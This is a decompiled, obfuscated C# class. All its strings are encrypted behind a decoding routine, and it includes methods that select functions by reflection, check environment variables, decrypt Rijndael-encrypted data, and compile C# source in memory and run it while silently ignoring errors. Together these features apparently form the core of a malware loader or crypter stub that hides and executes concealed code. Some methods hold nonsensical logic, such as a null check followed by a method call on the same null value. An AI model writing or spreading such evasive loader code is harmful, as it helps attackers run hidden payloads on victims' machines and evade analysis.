using System;
using System.CodeDom.Compiler;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using Microsoft.CSharp;
using ns1;

namespace ns0;

internal class Class0
{
	private static Class1 class1_0 = new Class1();

	public string method_0(string string_0)
	{
		string environmentVariable = Environment.GetEnvironmentVariable(string_0);
		Type typeFromHandle = typeof(Class0);
		MethodInfo methodInfo = null;
		MethodInfo[] methods = typeFromHandle.GetMethods();
		foreach (MethodInfo methodInfo2 in methods)
		{
			ParameterInfo[] parameters = methodInfo2.GetParameters();
			if (parameters.Length == 3 && (object)parameters[0].ParameterType == Type.GetType(Class2.smethod_0(1457293294, 434692657, 306500893)))
			{
				_ = methodInfo2.Name;
				methodInfo = methodInfo2;
				break;
			}
		}
		object obj = Activator.CreateInstance(typeFromHandle);
		object[] parameters2 = new object[3]
		{
			1,
			environmentVariable,
			Class2.smethod_0(152675451, 434692669, 306500875)
		};
		object obj2 = methodInfo.Invoke(obj, parameters2);
		return (string)obj2;
	}

	public string method_1(int int_0)
	{
		if (!(method_0(Class2.smethod_0(1997256319, 434692681, 306500911)).Replace(Class2.smethod_0(1905579359, 434692689, 306500879), Class2.smethod_0(624609389, 434692689, 306500871)).Replace(Class2.smethod_0(1998467535, 434692697, 306500879), Class2.smethod_0(1682635848, 434692697, 306500871)) == Class2.smethod_0(592061408, 434692707, 306500865)) && !(method_0(Class2.smethod_0(2108214918, 434692731, 306500895)).Replace(Class2.smethod_0(80726061, 434692611, 306500879), Class2.smethod_0(104337562, 434692611, 306500871)).Replace(Class2.smethod_0(1644009628, 434692619, 306500879), Class2.smethod_0(22562494, 434692619, 306500871)) != Class2.smethod_0(2087664149, 434692619, 306500871)))
		{
			return Class2.smethod_0(1495307541, 434692635, 306500867);
		}
		return Class2.smethod_0(489025849, 434692631, 306500875);
	}

	public string method_2(double double_0, string string_0, string string_1)
	{
		if (string_0 != null && string_0.ToString() == Class2.smethod_0(133891247, 434692741, 306500875))
		{
			return Class2.smethod_0(2045766056, 434692753, 306500875);
		}
		return Class2.smethod_0(787861490, 434692761, 306500879) + string_0 + Class2.smethod_0(705834725, 434692769, 306500879);
	}

	public string method_3(int int_0, string string_0, string string_1)
	{
		if (string_0 == null && string_0.ToString() == Class2.smethod_0(1328181377, 434692857, 306500895))
		{
			return string_0 + int_0;
		}
		return string_0 + string_1;
	}

	public string method_4(long long_0, string string_0, string string_1)
	{
		if (string_0.ToString() == Class2.smethod_0(1663799736, 434692833, 306500897))
		{
			return string_0 + long_0;
		}
		return string_0 + string_1;
	}

	public static string smethod_0(byte[] byte_0, string string_0, string string_1)
	{
		return Encoding.Unicode.GetString(smethod_1(byte_0, string_0, string_1));
	}

	public static byte[] smethod_1(byte[] byte_0, string string_0, string string_1)
	{
		MemoryStream stream = new MemoryStream(byte_0);
		MemoryStream memoryStream = new MemoryStream();
		Rijndael rijndael = Rijndael.Create();
		PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(string_0, Encoding.ASCII.GetBytes(string_1));
		rijndael.Key = passwordDeriveBytes.GetBytes(32);
		rijndael.IV = passwordDeriveBytes.GetBytes(16);
		ICryptoTransform transform = rijndael.CreateDecryptor();
		CryptoStream stream_ = new CryptoStream(stream, transform, CryptoStreamMode.Read);
		Stream0 stream2 = new Stream0(stream_);
		byte[] array = new byte[2048];
		int num;
		do
		{
			num = stream2.Read(array, 0, array.Length);
			memoryStream.Write(array, 0, num);
		}
		while (num > 0);
		stream2.Close();
		memoryStream.Flush();
		memoryStream.Close();
		return memoryStream.ToArray();
	}

	public static string smethod_2(string string_0)
	{
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		return BitConverter.ToString(mD5CryptoServiceProvider.ComputeHash(smethod_3(string_0))).Replace(Class2.smethod_0(979847953, 434692927, 306500869), Class2.smethod_0(1889941188, 434692927, 306500871));
	}

	private static byte[] smethod_3(string string_0)
	{
		return new ASCIIEncoding().GetBytes(string_0);
	}

	private static string smethod_4(byte[] byte_0)
	{
		return new ASCIIEncoding().GetString(byte_0, 0, byte_0.Length);
	}

	public static object smethod_5(string string_0, string string_1, string string_2, string[] string_3, object[] object_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Expected O, but got Unknown
		try
		{
			CSharpCodeProvider val = new CSharpCodeProvider();
			ICodeCompiler val2 = ((CodeDomProvider)val).CreateCompiler();
			CompilerParameters val3 = new CompilerParameters();
			foreach (string value in string_3)
			{
				val3.get_ReferencedAssemblies().Add(value);
			}
			val3.set_GenerateInMemory(true);
			CompilerResults val4 = val2.CompileAssemblyFromSource(val3, string_0);
			if (!val4.get_Errors().get_HasErrors())
			{
				object obj = val4.get_CompiledAssembly().CreateInstance(string_1);
				if (obj != null)
				{
					return obj.GetType().InvokeMember(string_2, BindingFlags.InvokeMethod, null, obj, object_0);
				}
			}
		}
		catch
		{
		}
		return null;
	}

	public static object smethod_6(string string_0, string string_1, string[] string_2, object[] object_0)
	{
		string string_3 = Class2.smethod_0(1280773094, 434692921, 306500929);
		return smethod_5(string_0, string_3, string_1, string_2, object_0);
	}
}
